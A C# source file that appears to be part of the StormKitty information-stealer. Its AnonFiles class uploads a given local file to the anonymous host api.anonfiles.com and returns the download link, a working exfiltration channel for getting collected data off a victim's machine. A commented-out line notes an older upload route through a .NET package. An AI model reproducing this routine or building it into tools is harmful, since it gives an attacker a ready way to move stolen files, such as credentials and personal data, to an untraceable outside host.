using System;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace StormKitty
{
  internal sealed class AnonFiles
  {
    public static string Upload(string file, bool api = false)
    {
      try
      {
        using (WebClient client = new WebClient())
        {
          byte[] response = client.UploadFile("https://api.anonfiles.com/upload", file);
          string responseString = Encoding.UTF8.GetString(response);
          int startIndex = responseString.IndexOf("\"short\": \"") + "\"short\": \"".Length;
          int endIndex = responseString.IndexOf("\"", startIndex);
          string url = responseString.Substring(startIndex, endIndex - startIndex);
          string unescapedUrl = Regex.Unescape(url);

          return unescapedUrl;
        }

        // olds way through dotnet package removed it and using the anon file directly to upload now 
        // string urls = AnonFile.Api.Upload(file, api); 
        // return urls;
      }
      catch (Exception error)
      {
        Logging.Log("AnonFile Upload : Connection error\n" + error);
      }
      return null;
    }
  }
}

